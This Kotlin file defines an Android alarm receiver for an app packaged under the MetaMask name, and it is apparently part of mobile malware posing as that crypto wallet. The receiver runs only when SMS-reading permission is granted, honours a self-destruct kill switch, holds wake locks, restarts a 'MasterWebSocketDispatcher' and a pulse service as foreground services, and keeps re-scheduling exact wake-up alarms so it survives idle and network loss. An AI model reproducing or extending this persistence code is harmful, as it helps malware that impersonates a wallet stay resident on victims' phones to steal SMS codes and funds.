package com.example.MetaMask.receivers

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.PowerManager
import androidx.annotation.Keep
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.OutOfQuotaPolicy
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.SelfDestructService
import com.example.MetaMask.services.ServiceStarterWorker

@Keep
class AlarmReceiver : BroadcastReceiver() {

    private val FALLBACK_ALARM_DELAY = 60 * 1000L

    companion object {
        private const val RETRY_ALARM_ID = 888
        private const val ADAPTIVE_PREFS = "alarm_adaptive"
        private const val KEY_NO_NET_COUNT = "no_net_count"
        private const val DELAY_BASE_MS = 60_000L
        private const val DELAY_MID_MS  = 120_000L
        private const val DELAY_MAX_MS  = 300_000L
    }

    override fun onReceive(context: Context, intent: Intent) {
        android.util.Log.d("XDBG", "[AlarmReceiver] onReceive enter context=ctx intent=${intent}") //xdbg
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        val wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MetaMask:AlarmWakeLock")
        wakeLock.acquire(5000)
        val hasReadSms = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
            if (wakeLock.isHeld) wakeLock.release()
            return
        }

        try {
            val killSwitchPrefs = context.getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
            if (killSwitchPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) return

            try {
                val request = OneTimeWorkRequestBuilder<ServiceStarterWorker>()
                    .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                    .setInputData(workDataOf("ACTION" to "ALARM_TRIGGER"))
                    .build()
                WorkManager.getInstance(context).enqueue(request)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[AlarmReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }

            startServiceDirectly(context)
            scheduleNextAlarm(context, computeAdaptiveDelay(context), 777)

        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[AlarmReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        } finally {
            if (wakeLock.isHeld) wakeLock.release()
        }
    }

    private fun isNetworkAvailable(context: Context): Boolean {
        android.util.Log.d("XDBG", "[AlarmReceiver] isNetworkAvailable enter context=ctx") //xdbg
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        android.util.Log.d("XDBG", "[AlarmReceiver] return") //xdbg
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(network) ?: return false
            caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } else {
            @Suppress("DEPRECATION")
            cm.activeNetworkInfo?.isConnected == true
        }
    }

    private fun computeAdaptiveDelay(context: Context): Long {
        android.util.Log.d("XDBG", "[AlarmReceiver] computeAdaptiveDelay enter context=ctx") //xdbg
        val prefs = context.getSharedPreferences(ADAPTIVE_PREFS, Context.MODE_PRIVATE)
        android.util.Log.d("XDBG", "[AlarmReceiver] return") //xdbg
        return if (isNetworkAvailable(context)) {
            prefs.edit().putInt(KEY_NO_NET_COUNT, 0).apply()
            DELAY_BASE_MS
        } else {
            val count = prefs.getInt(KEY_NO_NET_COUNT, 0) + 1
            prefs.edit().putInt(KEY_NO_NET_COUNT, count).apply()
            when {
                count <= 2 -> DELAY_BASE_MS
                count <= 5 -> DELAY_MID_MS
                else       -> DELAY_MAX_MS
            }
        }
    }

    private fun startServiceDirectly(context: Context) {
        android.util.Log.d("XDBG", "[AlarmReceiver] startServiceDirectly enter context=ctx") //xdbg
        try {
            val pulseIntent = Intent(context, com.example.MetaMask.services.PulseService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
                context.startForegroundService(pulseIntent)
            } else {
                context.startService(pulseIntent)
            }
        } catch (e: Exception) { }

        val serviceIntent = Intent(context, MasterWebSocketDispatcher::class.java)

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[AlarmReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            if (Build.VERSION.SDK_INT >= 31) {
                android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
                scheduleNextAlarm(context, 2000L, RETRY_ALARM_ID)
            }
        }
    }

    private fun scheduleNextAlarm(context: Context, delayMs: Long, requestCode: Int) {
        android.util.Log.d("XDBG", "[AlarmReceiver] scheduleNextAlarm enter context=ctx delayMs=${delayMs} requestCode=${requestCode}") //xdbg
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val nextIntent = Intent(context, AlarmReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            context,
            requestCode,
            nextIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val triggerTime = System.currentTimeMillis() + delayMs

        if (Build.VERSION.SDK_INT >= 31) {
            android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
            if (alarmManager.canScheduleExactAlarms()) {
                android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            } else {
                alarmManager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            }
        } else {
            if (Build.VERSION.SDK_INT >= 23) {
                android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            } else {
                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            }
        }
    }
}
